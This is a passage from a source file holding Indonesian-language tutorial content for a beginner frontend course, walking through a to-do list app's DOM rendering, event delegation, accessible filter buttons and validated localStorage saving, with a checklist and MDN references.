          input: document.querySelector('#judul'),
          error: document.querySelector('#error'),
          daftar: document.querySelector('#daftar'),
          ringkasan: document.querySelector('#ringkasan'),
        };

        let daftar = muatDariPenyimpanan();
        let filter = FILTER.SEMUA;

        function render() {
          const terlihat = saring(daftar, filter);
          el.daftar.replaceChildren();

          if (terlihat.length === 0) {
            const kosong = document.createElement('li');
            kosong.className = 'kosong';
            kosong.textContent =
              daftar.length === 0
                ? 'Belum ada tugas. Tambahkan yang pertama di atas.'
                : 'Tidak ada tugas yang cocok dengan saringan ini.';
            el.daftar.append(kosong);
          } else {
            const fragment = document.createDocumentFragment();
            for (const t of terlihat) fragment.append(buatBaris(t));
            el.daftar.append(fragment);
          }

          const r = ringkasan(daftar);
          el.ringkasan.textContent = \`\${r.selesai} dari \${r.total} selesai (\${r.persen}%)\`;
          simpanKePenyimpanan(daftar);
        }
        `,
      ),
      callout(
        'info',
        'Dua keadaan kosong yang berbeda',
        '"Belum ada tugas sama sekali" dan "ada tugas, tapi tidak ada yang cocok dengan saringan" adalah situasi berbeda dan butuh kalimat berbeda. Menyamakannya membuat pengguna mengira datanya hilang.',
      ),

      h2('3. Membuat baris — tanpa `innerHTML`'),
      code(
        'js',
        `
        function buatBaris(tugas) {
          const li = document.createElement('li');
          li.dataset.id = tugas.id;
          li.classList.toggle('selesai', tugas.selesai);

          const centang = document.createElement('input');
          centang.type = 'checkbox';
          centang.checked = tugas.selesai;
          centang.dataset.aksi = 'toggle';
          centang.id = \`t-\${tugas.id}\`;

          const label = document.createElement('label');
          label.htmlFor = centang.id;
          label.textContent = tugas.judul;      // AMAN untuk teks apa pun

          const hapusBtn = document.createElement('button');
          hapusBtn.type = 'button';
          hapusBtn.dataset.aksi = 'hapus';
          hapusBtn.textContent = 'Hapus';
          hapusBtn.setAttribute('aria-label', \`Hapus tugas: \${tugas.judul}\`);

          li.append(centang, label, hapusBtn);
          return li;
        }
        `,
      ),

      h2('4. Satu listener untuk seluruh daftar'),
      code(
        'js',
        `
        el.daftar.addEventListener('click', (e) => {
          const kontrol = e.target.closest('[data-aksi]');
          if (!kontrol) return;

          const id = kontrol.closest('[data-id]').dataset.id;

          if (kontrol.dataset.aksi === 'toggle') daftar = toggleSelesai(daftar, id);
          if (kontrol.dataset.aksi === 'hapus')  daftar = hapus(daftar, id);

          render();
        });
        `,
      ),

      h2('5. Form dengan penanganan error'),
      code(
        'js',
        `
        el.form.addEventListener('submit', (e) => {
          e.preventDefault();
          el.error.textContent = '';

          try {
            daftar = tambah(daftar, buatTugas(el.input.value));
            el.input.value = '';
            el.input.focus();          // siap mengetik berikutnya
            render();
          } catch (error) {
            // Error dari modul logika, bukan dari sini — itu memang tempatnya
            el.error.textContent = error.message;
            el.input.setAttribute('aria-invalid', 'true');
          }
        });
        `,
      ),

      h2('6. Filter dengan status yang terbaca teknologi bantu'),
      code(
        'js',
        `
        document.querySelector('[aria-label="Saring tugas"]')
          .addEventListener('click', (e) => {
            const tombol = e.target.closest('[data-filter]');
            if (!tombol) return;

            filter = tombol.dataset.filter;

            for (const b of e.currentTarget.querySelectorAll('[data-filter]')) {
              b.setAttribute('aria-pressed', String(b === tombol));
            }

            render();
          });
        `,
      ),

      h2('7. Menyimpan ke `localStorage`'),
      code(
        'js',
        `
        const KUNCI = 'todo.v1';

        function muatDariPenyimpanan() {
          try {
            const mentah = localStorage.getItem(KUNCI);
            if (!mentah) return [];

            const data = JSON.parse(mentah);
            if (!Array.isArray(data)) return [];   // data rusak — jangan dipercaya

            return data.filter(
              (t) => typeof t?.id === 'string' && typeof t?.judul === 'string',
            );
          } catch {
            return [];   // JSON rusak atau storage diblokir
          }
        }

        function simpanKePenyimpanan(data) {
          try {
            localStorage.setItem(KUNCI, JSON.stringify(data));
          } catch (error) {
            // Kuota penuh atau mode privat — beri tahu, jangan telan diam-diam
            el.error.textContent = 'Perubahan tidak bisa disimpan di browser ini.';
            console.error('[simpan]', error);
          }
        }
        `,
      ),
      callout(
        'warning',
        'Data dari `localStorage` adalah input yang tidak tepercaya',
        'Ia bisa diedit tangan lewat DevTools, tersisa dari versi aplikasi yang lama, atau rusak sebagian. Selalu validasi bentuknya setelah `JSON.parse` — persis seperti yang kamu lakukan pada respons API.',
      ),

      checklist(
        'frontend-basic/manipulasi-dom/praktik',
        'Checklist praktik 4.13',
        'Modul `todo.js` dari Bab 1 dipakai tanpa diubah satu baris pun',
        'Tidak ada satu pun `innerHTML` di seluruh berkas',
        'Hanya ada satu listener untuk seluruh daftar (event delegation)',
        'Dua keadaan kosong dibedakan: belum ada tugas vs tidak cocok saringan',
        'Judul kosong ditolak, pesannya muncul di `role="alert"`, fokus kembali ke input',
        'Data dari `localStorage` divalidasi bentuknya setelah `JSON.parse`',
        'Kegagalan menyimpan diberitahukan, bukan ditelan diam-diam',
        'Seluruh aplikasi bisa dipakai hanya dengan keyboard',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Logika yang terpisah bisa diberi tampilan tanpa diubah — itu buktinya benar.',
        'Render dari data; jangan pernah menulis HTML dengan menyambung string.',
        'Satu listener dengan delegation menangani baris yang belum dibuat.',
        'Bedakan keadaan kosong yang berbeda penyebabnya.',
        'Perlakukan `localStorage` sebagai input tidak tepercaya.',
        'Di Frontend Intermediate, React akan mengotomatiskan `render()` — dan sekarang kamu tahu persis apa yang diotomatiskan.',
      ),
      references(
        {
          label: 'ARIA states and properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Attributes',
          source: 'MDN',
          note: 'Rujukan `aria-live`, `aria-pressed`, dan `aria-label` yang dipakai di praktik ini.',
        },
        {
          label: 'Using ARIA: Roles, states, and properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Guides/Techniques',
          source: 'MDN',
          note: 'Termasuk aturan pertama ARIA: pakai elemen HTML bawaan dulu sebelum menambah ARIA.',
        },
        {
          label: 'Window.localStorage',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage',
          source: 'MDN',
          note: 'Termasuk kapan penulisan bisa gagal — dasar aturan "jangan telan kegagalan menyimpan".',
        },
        {
          label: 'JSON.parse()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse',
          source: 'MDN',
          note: 'Alasan hasilnya wajib divalidasi bentuknya — isi `localStorage` bisa diubah siapa saja.',
        },
        {
          label: 'Keyboard-navigable JavaScript widgets',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/Guides/Keyboard-navigable_JavaScript_widgets',
          source: 'MDN',
          note: 'Dasar butir checklist "seluruh aplikasi bisa dipakai hanya dengan keyboard".',
        },
      ),
    ],
  ),
];
